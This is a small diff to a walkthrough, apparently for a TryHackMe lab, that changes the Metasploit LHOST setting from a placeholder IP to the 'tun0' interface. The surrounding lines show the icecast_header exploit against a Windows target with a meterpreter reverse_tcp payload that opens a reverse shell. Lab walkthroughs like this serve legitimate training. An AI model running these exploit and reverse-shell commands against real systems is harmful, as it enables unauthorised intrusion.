@@ -143,7 +143,7 @@ Interact with a module by name or index. For example info 8, use 8 or use exploi
 ```
 msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
 msf6 exploit(windows/http/icecast_header) > use exploit/windows/http/icecast_header
-msf6 exploit(windows/http/icecast_header) > set LHOST <YOUR_IP_ON_TRYHACKME>
+msf6 exploit(windows/http/icecast_header) > set LHOST tun0
 msf6 exploit(windows/http/icecast_header) > set RHOSTS <MACHINE_IP>
 meterpreter > ps
 
